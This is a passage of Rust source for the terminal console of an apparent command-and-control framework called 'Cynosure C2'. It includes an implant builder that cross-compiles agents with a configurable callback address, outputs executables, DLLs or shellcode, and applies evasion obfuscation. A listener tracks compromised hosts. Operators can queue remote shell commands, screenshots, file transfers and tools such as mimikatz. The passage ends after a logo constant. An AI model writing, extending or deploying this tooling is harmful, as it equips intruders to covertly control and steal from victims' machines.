use crossterm::{
    event::{self, Event, KeyCode},
    execute,
    terminal::{disable_raw_mode, enable_raw_mode, EnterAlternateScreen, LeaveAlternateScreen},
};
use ratatui::{
    backend::CrosstermBackend,
    layout::{Constraint, Direction, Layout, Rect},
    style::{Color, Modifier, Style},
    text::{Line, Span},
    widgets::{Block, BorderType, Borders, Clear, Gauge, List, ListItem, ListState, Paragraph},
    Terminal,
};
use std::{
    io,
    process::Command,
    sync::{Arc, Mutex},
    thread,
    time::Duration,
};

mod loader;
mod listener;
use loader::discover_tree;


// ================================================================
// DATA STRUCTURES
// ================================================================

#[derive(Clone)]
struct LoadedModule {
    name:    &'static str,
    kind:    &'static str,
    version: &'static str,
    active:  bool,
}

#[derive(Clone)]
struct ImplantSession {
    id:        String,
    name:      String,
    ip:        String,
    subnet:    String,
    beacon:    String,
    protocol:  String,
    hostname:  String,
    user:      String,
    os:        String,
    arch:      String,
    pid:       u32,
    status:    String,
    last_seen: String,
    uptime:    String,
    elevated:  bool,
    modules:   Vec<LoadedModule>,
}

impl ImplantSession {
    fn from_live(ls: &listener::LiveSession) -> Self {
        Self {
            id:        ls.agent_id.clone(),
            name:      "cynosure-agent".into(),
            ip:        ls.ip.clone(),
            subnet:    "—".into(),
            beacon:    format!("{}:4444", ls.ip),
            protocol:  "HTTPS".into(),
            hostname:  ls.hostname.clone(),
            user:      ls.username.clone(),
            os:        ls.os.clone(),
            arch:      ls.arch.clone(),
            pid:       ls.pid,
            status:    listener::session_status(ls).into(),
            last_seen: listener::last_seen_str(ls),
            uptime:    listener::uptime_str(ls),
            elevated:  ls.elevated,
            modules:   vec![],
        }
    }
}


const COMMANDS: &[(&str, &str)] = &[
    ("upload",       "Upload file to target"),
    ("download",     "Download file from target"),
    ("shell",        "Execute shell command"),
    ("screenshot",   "Capture desktop screenshot"),
    ("ps",           "List running processes"),
    ("netstat",      "Show active connections"),
    ("sysinfo",      "Dump full system information"),
    ("kill-session", "Terminate and clean up session"),
];


// ================================================================
// BUILDER STATE
// ================================================================

/// Cross-compiler targets and their gcc frontend binaries.
const BUILD_TARGETS: &[(&str, &str, &str)] = &[
    // (label, compiler binary, output extension)
    ("Windows x86_64  (PE64)",  "x86_64-w64-mingw32-gcc",  "exe"),
    ("Windows x86     (PE32)",  "i686-w64-mingw32-gcc",     "exe"),
    ("Linux x86_64    (ELF64)", "gcc",                      "elf"),
    ("Linux ARM64     (ELF64)", "aarch64-linux-gnu-gcc",    "elf"),
    ("Linux ARM       (ELF32)", "arm-linux-gnueabihf-gcc",  "elf"),
    ("macOS x86_64    (Mach-O)","o64-clang",                "macho"),
    ("macOS ARM64     (Mach-O)","oa64-clang",               "macho"),
];

const BUILD_FORMATS: &[&str] = &[
    "Executable",
    "Shared Library (.dll / .so)",
    "Raw Shellcode   (.bin)",
];

const BUILD_OBFUSCATIONS: &[&str] = &[
    "None",
    "String encryption  (-DSTR_ENC)",
    "Control flow      (-DCFLOW)",
    "Stack strings      (-DSTACK_STR)",
    "Full              (-DFULL_OBFUSC)",
];

#[derive(Clone, PartialEq)]
enum BuildStatus {
    Idle,
    Building,
    Success,
    Failed,
}

/// Which sub-field of the builder is the cursor in.
#[derive(Clone, PartialEq)]
enum BuilderField {
    Target,
    Format,
    Obfuscation,
    CbIp,
    CbPort,
    OutputName,
    BuildButton,
}

impl BuilderField {
    fn next(&self) -> Self {
        match self {
            BuilderField::Target      => BuilderField::Format,
            BuilderField::Format      => BuilderField::Obfuscation,
            BuilderField::Obfuscation => BuilderField::CbIp,
            BuilderField::CbIp        => BuilderField::CbPort,
            BuilderField::CbPort      => BuilderField::OutputName,
            BuilderField::OutputName  => BuilderField::BuildButton,
            BuilderField::BuildButton => BuilderField::Target,
        }
    }
    fn prev(&self) -> Self {
        match self {
            BuilderField::Target      => BuilderField::BuildButton,
            BuilderField::Format      => BuilderField::Target,
            BuilderField::Obfuscation => BuilderField::Format,
            BuilderField::CbIp        => BuilderField::Obfuscation,
            BuilderField::CbPort      => BuilderField::CbIp,
            BuilderField::OutputName  => BuilderField::CbPort,
            BuilderField::BuildButton => BuilderField::OutputName,
        }
    }
}

struct BuilderState {
    // Option selectors
    target_idx:     usize,
    format_idx:     usize,
    obfusc_idx:     usize,
    // Text fields (editable)
    cb_ip:          String,
    cb_port:        String,
    output_name:    String,
    // Which field cursor is on
    field:          BuilderField,
    editing:        bool,         // true = typing into a text field
    // Build output log (shared with build thread)
    log:            Arc<Mutex<Vec<String>>>,
    status:         Arc<Mutex<BuildStatus>>,
    // Log scroll
    log_scroll:     usize,
}

fn detect_local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|s| { s.connect("8.8.8.8:80")?; s.local_addr() })
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|_| "127.0.0.1".into())
}

impl BuilderState {
    fn new() -> Self {
        Self {
            target_idx:  0,
            format_idx:  0,
            obfusc_idx:  0,
            cb_ip:       detect_local_ip(),
            cb_port:     String::from("4444"),
            output_name: String::from("implant"),
            field:       BuilderField::Target,
            editing:     false,
            log:         Arc::new(Mutex::new(Vec::new())),
            status:      Arc::new(Mutex::new(BuildStatus::Idle)),
            log_scroll:  0,
        }
    }

    fn current_status(&self) -> BuildStatus {
        self.status.lock().unwrap().clone()
    }

    fn is_building(&self) -> bool {
        self.current_status() == BuildStatus::Building
    }

    fn log_lines(&self) -> Vec<String> {
        self.log.lock().unwrap().clone()
    }

    fn push_log(&self, line: impl Into<String>) {
        self.log.lock().unwrap().push(line.into());
    }

    fn clear_log(&self) {
        self.log.lock().unwrap().clear();
    }

    fn set_status(&self, s: BuildStatus) {
        *self.status.lock().unwrap() = s;
    }

    /// Kick off a build in a background thread.
    fn start_build(&self) {
        if self.is_building() { return; }
        self.clear_log();
        self.set_status(BuildStatus::Building);

        let (compiler, output_ext) = {
            let (_, bin, ext) = BUILD_TARGETS[self.target_idx];
            (bin.to_string(), ext.to_string())
        };
        let obfusc_flag = match self.obfusc_idx {
            1 => Some("-DSTR_ENC"),
            2 => Some("-DCFLOW"),
            3 => Some("-DSTACK_STR"),
            4 => Some("-DFULL_OBFUSC"),
            _ => None,
        };
        let format_flags: Vec<&str> = match self.format_idx {
            1 => vec!["-shared", "-fPIC"],
            2 => vec!["-nostdlib", "-fPIC", "-DSHELLCODE"],
            _ => vec![],
        };
        let cb_ip       = self.cb_ip.clone();
        let cb_port     = self.cb_port.clone();
        let output_name = self.output_name.clone();
        let log         = Arc::clone(&self.log);
        let status      = Arc::clone(&self.status);

        thread::spawn(move || {
            let push = |msg: &str| log.lock().unwrap().push(msg.to_string());

            push(&format!("[*] Compiler  : {}", compiler));
            push(&format!("[*] Callback  : {}:{}", cb_ip, cb_port));
            push(&format!("[*] Output    : {}.out", output_name));
            push("[*] Starting build...");
            push("");

            let mut args: Vec<String> = vec![
                "src/implant/edr_agent.c".into(),
                "src/implant/edr_dispatcher.c".into(),
                "-I".into(), "src/implant".into(),
                format!("-DCB_IP=\"{}\"", cb_ip),
                format!("-DCB_PORT={}", cb_port),
                "-O2".into(),
                "-s".into(),
                "-o".into(), format!("output/{}.{}", output_name, output_ext),
            ];

            for f in format_flags { args.push(f.into()); }
            if let Some(flag) = obfusc_flag { args.push(flag.into()); }

            // Platform linker flags for the core agent only.
            // Comm modules (https_comm.dll, etc.) are separate DLLs loaded at runtime.
            match output_ext.as_str() {
                "elf"   => { args.push("-lpthread".into()); args.push("-ldl".into()); }
                "macho" => { args.push("-lpthread".into()); }
                _ => {}
            }

            // Ensure output dir exists
            let _ = std::fs::create_dir_all("output");

            push(&format!("[>] {} {}", compiler, args.join(" ")));
            push("");

            let result = Command::new(&compiler)
                .args(&args)
                .output();

            match result {
                Ok(out) => {
                    let stdout = String::from_utf8_lossy(&out.stdout);
                    let stderr = String::from_utf8_lossy(&out.stderr);

                    for line in stdout.lines() { push(&format!("    {}", line)); }
                    for line in stderr.lines() { push(&format!("    {}", line)); }

                    if out.status.success() {
                        push("");
                        push(&format!("[+] Build succeeded → output/{}.{}", output_name, output_ext));
                        *status.lock().unwrap() = BuildStatus::Success;
                    } else {
                        push("");
                        push(&format!("[!] Build failed (exit {})", out.status));
                        *status.lock().unwrap() = BuildStatus::Failed;
                    }
                }
                Err(e) => {
                    push(&format!("[!] Could not invoke compiler: {}", e));
                    push("[!] Is the cross-compiler installed and on PATH?");
                    push("    Windows : mingw-w64 (x86_64-w64-mingw32-gcc, i686-w64-mingw32-gcc)");
                    push("    ARM64   : gcc-aarch64-linux-gnu");
                    push("    ARM32   : gcc-arm-linux-gnueabihf");
                    push("    macOS   : osxcross (o64-clang, oa64-clang)");
                    *status.lock().unwrap() = BuildStatus::Failed;
                }
            }
        });
    }

    /// Handle keypress when builder panel is focused.
    fn on_key(&mut self, key: KeyCode) -> bool {
        // If editing a text field, handle character input.
        if self.editing {
            let field_str = match self.field {
                BuilderField::CbIp       => Some(&mut self.cb_ip),
                BuilderField::CbPort     => Some(&mut self.cb_port),
                BuilderField::OutputName => Some(&mut self.output_name),
                _ => None,
            };
            if let Some(s) = field_str {
                match key {
                    KeyCode::Enter | KeyCode::Esc => { self.editing = false; }
                    KeyCode::Backspace => { s.pop(); }
                    KeyCode::Char(c)   => { s.push(c); }
                    _ => {}
                }
                return true;
            }
        }

        match key {
            // Tab / shift-tab handled by caller
            KeyCode::Down | KeyCode::Char('j') | KeyCode::Tab => {
                self.field = self.field.next();
            }
            KeyCode::Up | KeyCode::Char('k') | KeyCode::BackTab => {
                self.field = self.field.prev();
            }
            KeyCode::Left | KeyCode::Char('h') => {
                match self.field {
                    BuilderField::Target => {
                        if self.target_idx > 0 { self.target_idx -= 1; }
                    }
                    BuilderField::Format => {
                        if self.format_idx > 0 { self.format_idx -= 1; }
                    }
                    BuilderField::Obfuscation => {
                        if self.obfusc_idx > 0 { self.obfusc_idx -= 1; }
                    }
                    _ => {}
                }
            }
            KeyCode::Right | KeyCode::Char('l') => {
                match self.field {
                    BuilderField::Target => {
                        if self.target_idx + 1 < BUILD_TARGETS.len() { self.target_idx += 1; }
                    }
                    BuilderField::Format => {
                        if self.format_idx + 1 < BUILD_FORMATS.len() { self.format_idx += 1; }
                    }
                    BuilderField::Obfuscation => {
                        if self.obfusc_idx + 1 < BUILD_OBFUSCATIONS.len() { self.obfusc_idx += 1; }
                    }
                    _ => {}
                }
            }
            KeyCode::Enter => {
                match self.field {
                    BuilderField::CbIp |
                    BuilderField::CbPort |
                    BuilderField::OutputName => { self.editing = true; }
                    BuilderField::BuildButton => { self.start_build(); }
                    _ => {}
                }
            }
            KeyCode::Char('b') => {
                // Quick build shortcut from anywhere in builder
                self.start_build();
            }
            KeyCode::Char('c') => {
                // Clear log
                self.clear_log();
                self.set_status(BuildStatus::Idle);
            }
            KeyCode::PageDown | KeyCode::Char('d') => {
                self.log_scroll = self.log_scroll.saturating_add(5);
            }
            KeyCode::PageUp | KeyCode::Char('u') => {
                self.log_scroll = self.log_scroll.saturating_sub(5);
            }
            _ => { return false; }
        }
        true
    }
}


// ================================================================
// PANEL + APP STATE
// ================================================================

#[derive(PartialEq, Clone)]
enum Panel {
    Category, Subcategory, Module,
    Sessions, SessionDetail, ImplantModules, ImplantCommand, TransportSelector,
    Builder, RLModelStatus,
}

#[derive(Clone, PartialEq)]
enum FileOpMode {
    Upload,
    Download,
}

struct FileOperation {
    mode: FileOpMode,
    local_path: String,   // Path on TUI machine
    remote_path: String,  // Path on agent machine
    progress: f32,        // 0.0 to 1.0
    status: String,
    path_input_step: u32, // 0=local, 1=remote (for two-path input)
}

impl Panel {
    fn in_module_world(&self) -> bool {
        matches!(self, Panel::Category | Panel::Subcategory | Panel::Module)
    }
    fn in_implant_world(&self) -> bool {
        matches!(self, Panel::Sessions | Panel::SessionDetail | Panel::ImplantModules | Panel::ImplantCommand | Panel::TransportSelector | Panel::RLModelStatus)
    }
    fn in_builder_world(&self) -> bool {
        matches!(self, Panel::Builder)
    }
}

struct TransportModule {
    name: String,
    priority: u8,
    is_active: bool,
    is_connected: bool,
}

struct RLModelMetrics {
    step_count: u64,
    epsilon: f32,
    avg_loss: f32,
    success_rate: f32,
    successful_beacons: u64,
    failed_beacons: u64,
    memory_size: usize,
    current_episode_reward: f32,
}

struct App {
    categories: Vec<loader::Category>,
    cat_state:  ListState,
    sub_state:  ListState,
    mod_state:  ListState,

    sessions:      Vec<ImplantSession>,
    sess_state:    ListState,
    imod_state:    ListState,
    cmd_state:     ListState,
    transport_state: ListState,
    transports:    Vec<TransportModule>,
    live_sessions: listener::SessionStore,
    cmd_queue:     listener::CommandQueue,
    dl_store:      listener::DownloadStore,
    listener_port: u16,
    listener_ok:   bool,

    builder:     BuilderState,
    rl_metrics:  RLModelMetrics,
    last_action: String,  // feedback for recent actions
    file_op:     Option<FileOperation>,  // active file transfer
    shell_cmd_pending: Option<String>,  // waiting for shell command input
    shell_input: String,  // buffer for shell command input

    focus:       Panel,
    should_quit: bool,
}

impl App {
    fn new(categories: Vec<loader::Category>) -> Self {
        let mut cat_state = ListState::default();
        if !categories.is_empty() { cat_state.select(Some(0)); }

        let mut sub_state = ListState::default();
        if !categories.is_empty() && !categories[0].subcategories.is_empty() {
            sub_state.select(Some(0));
        }

        let mut mod_state = ListState::default();
        if !categories.is_empty()
            && !categories[0].subcategories.is_empty()
            && !categories[0].subcategories[0].modules.is_empty()
        {
            mod_state.select(Some(0));
        }

        let sessions: Vec<ImplantSession> = vec![];
        let sess_state = ListState::default();
        let imod_state = ListState::default();

        let mut cmd_state = ListState::default();
        cmd_state.select(Some(0));

        let transport_state = ListState::default();
        let transports: Vec<TransportModule> = vec![];

        let live_sessions = listener::new_store();
        let cmd_queue = listener::new_command_queue();
        let dl_store = listener::new_download_store();
        let listener_port = 4444u16;
        let listener_ok = listener::start(listener_port, Arc::clone(&live_sessions), Arc::clone(&cmd_queue), Arc::clone(&dl_store));

        Self {
            categories,
            cat_state, sub_state, mod_state,
            sessions,
            sess_state, imod_state, cmd_state,
            transport_state,
            transports,
            live_sessions,
            cmd_queue,
            dl_store,
            listener_port,
            listener_ok,
            builder: BuilderState::new(),
            rl_metrics: RLModelMetrics {
                step_count: 0,
                epsilon: 1.0,
                avg_loss: 0.0,
                success_rate: 0.0,
                successful_beacons: 0,
                failed_beacons: 0,
                memory_size: 0,
                current_episode_reward: 0.0,
            },
            last_action: String::new(),
            file_op: None,
            shell_cmd_pending: None,
            shell_input: String::new(),
            focus: Panel::Category,
            should_quit: false,
        }
    }

    fn sel_cat(&self)  -> usize { self.cat_state.selected().unwrap_or(0) }
    fn sel_sub(&self)  -> usize { self.sub_state.selected().unwrap_or(0) }
    fn sel_mod(&self)  -> usize { self.mod_state.selected().unwrap_or(0) }
    fn sel_sess(&self) -> usize { self.sess_state.selected().unwrap_or(0) }

    fn sub_len(&self) -> usize {
        self.categories.get(self.sel_cat()).map(|c| c.subcategories.len()).unwrap_or(0)
    }
    fn mod_len(&self) -> usize {
        let ci = self.sel_cat(); let si = self.sel_sub();
        self.categories.get(ci).and_then(|c| c.subcategories.get(si)).map(|s| s.modules.len()).unwrap_or(0)
    }
    fn imod_len(&self) -> usize {
        self.sessions.get(self.sel_sess()).map(|s| s.modules.len()).unwrap_or(0)
    }

    fn selected_session(&self) -> Option<&ImplantSession> {
        self.sessions.get(self.sel_sess())
    }

    fn refresh_sessions(&mut self) {
        let snap = self.live_sessions.lock().unwrap().clone();
        self.sessions = snap.values().map(ImplantSession::from_live).collect();
        self.sessions.sort_by(|a, b| a.id.cmp(&b.id));
        if self.sessions.is_empty() {
            self.sess_state.select(None);
        } else {
            let cur = self.sess_state.selected().unwrap_or(0);
            self.sess_state.select(Some(cur.min(self.sessions.len() - 1)));
        }
    }

    fn load_implant_modules(&mut self) {
        let idx = self.sel_sess();
        if idx < self.sessions.len() {
            self.sessions[idx].modules = vec![
                LoadedModule { name: "mimikatz", kind: "recon", version: "2.2.0-20220919", active: true },
                LoadedModule { name: "sharp-dumper", kind: "exfil", version: "1.3.1", active: false },
                LoadedModule { name: "socks-tunnel", kind: "tunnel", version: "0.8.2", active: true },
            ];
            self.imod_state.select(Some(0));
        }
    }

    fn load_transports(&mut self) {
        self.transports = vec![
            TransportModule { name: "HTTPS".to_string(), priority: 1, is_active: true, is_connected: true },
            TransportModule { name: "DNS".to_string(), priority: 2, is_active: false, is_connected: false },
            TransportModule { name: "VPN".to_string(), priority: 3, is_active: false, is_connected: true },
        ];
        self.transport_state.select(Some(0));
    }

    fn on_key(&mut self, key: KeyCode) {
        // Handle shell command input
        if let Some(ref sess_id) = self.shell_cmd_pending {
            match key {
                KeyCode::Enter => {
                    let cmd = self.shell_input.clone();
                    if !cmd.is_empty() {
                        let q = self.cmd_queue.lock().unwrap();
                        let entry = q.get(sess_id).cloned().unwrap_or_default();
                        drop(q);

                        let mut q = self.cmd_queue.lock().unwrap();
                        let mut new_cmds = entry;
                        new_cmds.push(format!("shell:{}", cmd));
                        q.insert(sess_id.clone(), new_cmds);

                        self.last_action = format!("Shell command queued: {}", cmd);
                    }
                    self.shell_cmd_pending = None;
                    self.builder.editing = false;
                    self.shell_input.clear();
                }
                KeyCode::Esc => {
                    self.shell_cmd_pending = None;
                    self.builder.editing = false;
                    self.shell_input.clear();
                }
                KeyCode::Char(c) => {
                    self.shell_input.push(c);
                }
                KeyCode::Backspace => {
                    self.shell_input.pop();
                }
                _ => {}
            }
            return;
        }

        // Handle file operation input
        if let Some(ref mut fo) = self.file_op {
            match key {
                KeyCode::Char(c) if fo.progress == 0.0 => {
                    if fo.path_input_step == 0 {
                        fo.local_path.push(c);
                    } else {
                        fo.remote_path.push(c);
                    }
                }
                KeyCode::Backspace if fo.progress == 0.0 => {
                    if fo.path_input_step == 0 {
                        fo.local_path.pop();
                    } else {
                        fo.remote_path.pop();
                    }
                }
                KeyCode::Enter if fo.progress == 0.0 => {
                    if fo.path_input_step == 0 && !fo.local_path.is_empty() {
                        // Move to remote path input
                        fo.path_input_step = 1;
                        fo.status = if fo.mode == FileOpMode::Upload {
                            "Enter path where file should go on agent".to_string()
                        } else {
                            "File will be saved to current directory".to_string()
                        };
                    } else if fo.path_input_step == 1 && !fo.remote_path.is_empty() {
                        // Trigger file operation
                        fo.progress = 0.01;
                        fo.status = "Sending command to agent...".to_string();
                    } else if fo.path_input_step == 1 && fo.mode == FileOpMode::Download {
                        // Download doesn't need remote path confirmation
                        fo.progress = 0.01;
                        fo.status = "Sending command to agent...".to_string();
                    }
                }
                KeyCode::Esc if fo.progress >= 1.0 => {
                    // Close completed operation
                    self.file_op = None;
                    self.last_action = "File operation completed ✓".to_string();
                }
                KeyCode::Esc if fo.progress == 0.0 => {
                    // Cancel before starting
                    self.file_op = None;
                    self.last_action = "File operation cancelled".to_string();
                }
                _ => {}
            }
            return;
        }

        // Global quit (except when editing text in builder)
        if !self.builder.editing {
            if key == KeyCode::Char('q') || (key == KeyCode::Esc && !matches!(self.focus,
                Panel::Subcategory | Panel::Module | Panel::SessionDetail |
                Panel::ImplantModules | Panel::ImplantCommand | Panel::Builder |
                Panel::TransportSelector | Panel::RLModelStatus))
            {
                self.should_quit = true;
                return;
            }
        }

        // Builder world consumes its own keys
        if self.focus == Panel::Builder {
            match key {
                KeyCode::Esc if !self.builder.editing => {
                    self.focus = Panel::Sessions;
                    return;
                }
                // Tab out of builder
                KeyCode::F(1) => { self.focus = Panel::Category; return; }
                _ => {}
            }
            self.builder.on_key(key);
            return;
        }

        match self.focus.clone() {
            Panel::Category => match key {
                KeyCode::Up   | KeyCode::Char('k') => { let n = self.categories.len(); nav_up(&mut self.cat_state, n); self.sub_state.select(Some(0)); self.mod_state.select(Some(0)); }
                KeyCode::Down | KeyCode::Char('j') => { let n = self.categories.len(); nav_dn(&mut self.cat_state, n); self.sub_state.select(Some(0)); self.mod_state.select(Some(0)); }
                KeyCode::Enter | KeyCode::Right | KeyCode::Char('l') => { if self.sub_len() > 0 { self.focus = Panel::Subcategory; } }
                KeyCode::Tab => self.focus = Panel::Sessions,
                KeyCode::Char('q') | KeyCode::Esc => self.should_quit = true,
                _ => {}
            },
            Panel::Subcategory => match key {
                KeyCode::Up   | KeyCode::Char('k') => { let n = self.sub_len(); nav_up(&mut self.sub_state, n); self.mod_state.select(Some(0)); }
                KeyCode::Down | KeyCode::Char('j') => { let n = self.sub_len(); nav_dn(&mut self.sub_state, n); self.mod_state.select(Some(0)); }
                KeyCode::Enter | KeyCode::Right | KeyCode::Char('l') => { if self.mod_len() > 0 { self.focus = Panel::Module; } }
                KeyCode::Esc | KeyCode::Left | KeyCode::Char('h') => self.focus = Panel::Category,
                KeyCode::Tab => self.focus = Panel::Sessions,
                KeyCode::Char('q') => self.should_quit = true,
                _ => {}
            },
            Panel::Module => match key {
                KeyCode::Up   | KeyCode::Char('k') => { let n = self.mod_len(); nav_up(&mut self.mod_state, n); }
                KeyCode::Down | KeyCode::Char('j') => { let n = self.mod_len(); nav_dn(&mut self.mod_state, n); }
                KeyCode::Esc | KeyCode::Left | KeyCode::Char('h') => self.focus = Panel::Subcategory,
                KeyCode::Tab => self.focus = Panel::Sessions,
                KeyCode::Char('q') => self.should_quit = true,
                _ => {}
            },
            Panel::Sessions => match key {
                KeyCode::Up   | KeyCode::Char('k') => { let n = self.sessions.len(); nav_up(&mut self.sess_state, n); self.imod_state.select(Some(0)); }
                KeyCode::Down | KeyCode::Char('j') => { let n = self.sessions.len(); nav_dn(&mut self.sess_state, n); self.imod_state.select(Some(0)); }
                KeyCode::Enter | KeyCode::Right | KeyCode::Char('l') => self.focus = Panel::SessionDetail,
                KeyCode::Tab => self.focus = Panel::Builder,
                KeyCode::Char('q') | KeyCode::Esc => self.should_quit = true,
                _ => {}
            },
            Panel::SessionDetail => match key {
                KeyCode::Char('m') => { self.load_implant_modules(); self.focus = Panel::ImplantModules; }
                KeyCode::Char('c') => { self.cmd_state.select(Some(0)); self.focus = Panel::ImplantCommand; }
                KeyCode::Char('t') => { self.load_transports(); self.focus = Panel::TransportSelector; }
                KeyCode::Char('l') => { self.focus = Panel::RLModelStatus; }
                KeyCode::Esc | KeyCode::Left | KeyCode::Char('h') => self.focus = Panel::Sessions,
                KeyCode::Tab => self.focus = Panel::Builder,
                KeyCode::Char('q') => self.should_quit = true,
                _ => {}
            },
            Panel::ImplantModules => match key {
                KeyCode::Up   | KeyCode::Char('k') => { let n = self.imod_len(); nav_up(&mut self.imod_state, n); }
                KeyCode::Down | KeyCode::Char('j') => { let n = self.imod_len(); nav_dn(&mut self.imod_state, n); }
                KeyCode::Esc | KeyCode::Left | KeyCode::Char('h') => self.focus = Panel::SessionDetail,
                KeyCode::Tab => self.focus = Panel::Builder,
                KeyCode::Char('q') => self.should_quit = true,
                _ => {}
            },
            Panel::ImplantCommand => match key {
                KeyCode::Up   | KeyCode::Char('k') => { nav_up(&mut self.cmd_state, COMMANDS.len()); }
                KeyCode::Down | KeyCode::Char('j') => { nav_dn(&mut self.cmd_state, COMMANDS.len()); }
                KeyCode::Enter => {
                    if let Some(idx) = self.cmd_state.selected() {
                        if idx < COMMANDS.len() {
                            let (cmd, _) = COMMANDS[idx];
                            match cmd {
                                "upload" => {
                                    self.file_op = Some(FileOperation {
                                        mode: FileOpMode::Upload,
                                        local_path: String::new(),
                                        remote_path: String::new(),
                                        progress: 0.0,
                                        status: "Enter local file path to send".to_string(),
                                        path_input_step: 0,
                                    });
                                    self.last_action = "Upload mode: select local file".to_string();
                                }
                                "download" => {
                                    self.file_op = Some(FileOperation {
                                        mode: FileOpMode::Download,
                                        local_path: String::new(),
                                        remote_path: String::new(),
                                        progress: 0.0,
                                        status: "Enter remote file path on agent".to_string(),
                                        path_input_step: 0,
                                    });
                                    self.last_action = "Download mode: enter agent file path".to_string();
                                }
                                "shell" => {
                                    if let Some(sess) = self.selected_session().cloned() {
                                        // Prompt for shell command
                                        self.shell_input.clear();
                                        self.builder.editing = true;
                                        self.last_action = "Shell: Enter command to execute (e.g., ipconfig, tasklist, whoami)".to_string();
                                        self.shell_cmd_pending = Some(sess.id);
                                    } else {
                                        self.last_action = "No active session".to_string();
                                    }
                                }
                                "sysinfo" => {
                                    if let Some(sess) = self.selected_session() {
                                        self.last_action = format!(
                                            "Hostname: {} | User: {} | OS: {} | Arch: {} | PID: {} | Elevated: {}",
                                            sess.hostname,
                                            sess.user,
                                            sess.os,
                                            sess.arch,
                                            sess.pid,
                                            if sess.elevated { "YES ⚡" } else { "NO" }
                                        );
                                    } else {
                                        self.last_action = "No active session".to_string();
                                    }
                                }
                                "screenshot" => {
                                    if let Some(sess) = self.selected_session().cloned() {
                                        let q = self.cmd_queue.lock().unwrap();
                                        let entry = q.get(&sess.id).cloned().unwrap_or_default();
                                        drop(q);

                                        let mut q = self.cmd_queue.lock().unwrap();
                                        let mut new_cmds = entry.clone();
                                        new_cmds.push("screenshot".to_string());
                                        q.insert(sess.id, new_cmds);

                                        self.last_action = "Screenshot command queued ✓ (will appear in downloads as screenshot.bmp)".to_string();
                                    } else {
                                        self.last_action = "No active session".to_string();
                                    }
                                }
                                "ps" => {
                                    self.last_action = "Process list: Not yet implemented on agent".to_string();
                                }
                                "netstat" => {
                                    self.last_action = "Netstat: Not yet implemented on agent".to_string();
                                }
                                "kill-session" => {
                                    if let Some(sess) = self.selected_session().cloned() {
                                        let sess_id = sess.id.clone();
                                        self.sessions.retain(|s| s.id != sess_id);
                                        self.last_action = format!("Session {} terminated ✓", sess_id);
                                    } else {
                                        self.last_action = "No active session".to_string();
                                    }
                                }
                                _ => {
                                    self.last_action = format!("Command: {} (not yet implemented)", cmd);
                                }
                            }
                        }
                    }
                }
                KeyCode::Esc | KeyCode::Left | KeyCode::Char('h') | KeyCode::Char('q') => self.focus = Panel::SessionDetail,
                KeyCode::Tab => self.focus = Panel::Builder,
                _ => {}
            },
            Panel::TransportSelector => match key {
                KeyCode::Up   | KeyCode::Char('k') => { let n = self.transports.len(); nav_up(&mut self.transport_state, n); }
                KeyCode::Down | KeyCode::Char('j') => { let n = self.transports.len(); nav_dn(&mut self.transport_state, n); }
                KeyCode::Enter => {
                    if let Some(idx) = self.transport_state.selected() {
                        if idx < self.transports.len() {
                            let selected_name = self.transports[idx].name.clone();
                            // Mark selected transport as active, deactivate others
                            for (i, tm) in self.transports.iter_mut().enumerate() {
                                tm.is_active = i == idx;
                            }
                            self.last_action = format!("Active transport: {} ✓", selected_name);
                            // TODO: call dispatcher C API to actually switch the module on the implant
                        }
                    }
                }
                KeyCode::Esc | KeyCode::Left | KeyCode::Char('h') => self.focus = Panel::SessionDetail,
                KeyCode::Tab => self.focus = Panel::Builder,
                KeyCode::Char('q') => self.should_quit = true,
                _ => {}
            },
            Panel::RLModelStatus => match key {
                KeyCode::Esc | KeyCode::Left | KeyCode::Char('h') => self.focus = Panel::SessionDetail,
                KeyCode::Tab => self.focus = Panel::Builder,
                KeyCode::Char('q') => self.should_quit = true,
                _ => {}
            },
            Panel::Builder => { /* handled above */ }
        }
    }
}


// ================================================================
// NAV HELPERS
// ================================================================

fn nav_up(state: &mut ListState, len: usize) {
    if len == 0 { return; }
    let i = state.selected().unwrap_or(0);
    state.select(Some(if i == 0 { len - 1 } else { i - 1 }));
}

fn nav_dn(state: &mut ListState, len: usize) {
    if len == 0 { return; }
    let i = state.selected().unwrap_or(0);
    state.select(Some((i + 1) % len));
}


// ================================================================
// BORDER / STYLE HELPERS
// ================================================================

fn world_border(active: bool) -> (BorderType, Style) {
    if active {
        (BorderType::Double, Style::default().fg(Color::Cyan).add_modifier(Modifier::BOLD))
    } else {
        (BorderType::Plain, Style::default().fg(Color::DarkGray))
    }
}

fn panel_border(focused: bool) -> Style {
    if focused { Style::default().fg(Color::Green) } else { Style::default().fg(Color::DarkGray) }
}

fn inner_rect(area: Rect, margin: u16) -> Rect {
    Rect {
        x:      area.x.saturating_add(margin),
        y:      area.y.saturating_add(margin),
        width:  area.width.saturating_sub(margin * 2),
        height: area.height.saturating_sub(margin * 2),
    }
}

fn status_color(status: &str) -> Color {
    match status {
        "Active" => Color::Green,
        "Idle"   => Color::Yellow,
        "Lost"   => Color::Red,
        _        => Color::White,
    }
}

fn kind_color(kind: &str) -> Color {
    match kind {
        "recon"   => Color::Cyan,
        "exfil"   => Color::Yellow,
        "persist" => Color::Magenta,
        "tunnel"  => Color::Blue,
        _         => Color::White,
    }
}

fn build_status_color(s: &BuildStatus) -> Color {
    match s {
        BuildStatus::Idle     => Color::DarkGray,
        BuildStatus::Building => Color::Yellow,
        BuildStatus::Success  => Color::Green,
        BuildStatus::Failed   => Color::Red,
    }
}

fn field_border(active: bool, editing: bool) -> Style {
    if editing  { Style::default().fg(Color::Magenta).add_modifier(Modifier::BOLD) }
    else if active { Style::default().fg(Color::Green) }
    else        { Style::default().fg(Color::DarkGray) }
}


// ================================================================
// LOGO
// ================================================================

const LOGO: &str = r#" ██████╗██╗   ██╗███╗   ██╗ ██████╗ ███████╗██╗   ██╗██████╗ ███████╗     ██████╗██████╗ 
██╔════╝╚██╗ ██╔╝████╗  ██║██╔═══██╗██╔════╝██║   ██║██╔══██╗██╔════╝    ██╔════╝╚════██╗
██║      ╚████╔╝ ██║██╗ ██║██║   ██║███████╗██║   ██║██████╔╝█████╗      ██║      █████╔╝
██║       ╚██╔╝  ██║╚██╗██║██║   ██║╚════██║██║   ██║██╔══██╗██╔══╝      ██║     ██╔═══╝ 
╚██████╗   ██║   ██║ ╚████║╚██████╔╝███████║╚██████╔╝██║  ██║███████╗    ╚██████╗███████╗
 ╚═════╝   ╚═╝   ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝     ╚═════╝╚══════╝

 "#;


// ================================================================
